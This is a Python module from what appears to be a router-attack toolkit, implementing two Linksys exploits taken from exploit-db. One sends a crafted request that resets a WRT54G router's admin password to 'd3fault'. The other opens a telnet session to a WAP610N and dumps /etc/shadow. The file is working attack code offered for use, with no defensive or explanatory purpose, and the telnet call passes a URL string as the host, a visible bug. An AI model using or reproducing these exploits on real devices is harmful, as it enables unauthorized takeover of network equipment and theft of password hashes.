import util
import urllib, telnetlib

#
# linksys vulnerabilities
#

#
# list of supported Linksys vulns
#
def vulnerabilities():
	return [ 'WRT54G v1.00.9 - Reset Admin Password',
			  'WAP610N v1.0.01 - Dump shadow'
			]

#
# run the vuln
#
def run ( run ):
	if run == 1:
		# http://www.exploit-db.com/exploits/5313/
		tmp = vulnerabilities()[run-1]
		print '[dbg] running ', tmp
		print '[+] Resetting password at 192.168.1.1...'
		url = '''http://192.168.1.1/manage.tri?remote_mg_https=0&http_enable=1&https_enable=0&PasswdModify=1
			     &http_passwd=d3fault&http_passwdConfirm=d3fault&_http_enable=1&web_wl_filter=1
				 &remote_management=0&upnp_enable=1&layout=en
			  '''
		try:
			response = urllib.urlopen(url)
		except Exception, j:
			print '[-] Could not connect to host.'
			print '[dbg] error: ', j
			return
		print response.read()
		print '[+] Done.  Log in with administrative password \'d3fault\''
		return	

	elif run == 2:
		# http://www.exploit-db.com/exploits/16149/
		print '[+] Getting connection to host...'
		try:
			tn = telnetlib.Telnet('http://192.168.1.1')	

			tn.read_until('Command> ')
			tn.write('system cat /etc/shadow\n')
			tn.write('exit\n')
			print tn.read_all()
		except Exception, j:
			print '[-] Could not get host.'
			print '[dbg] error: ', j
			return
		print '[+] Done.'
		return
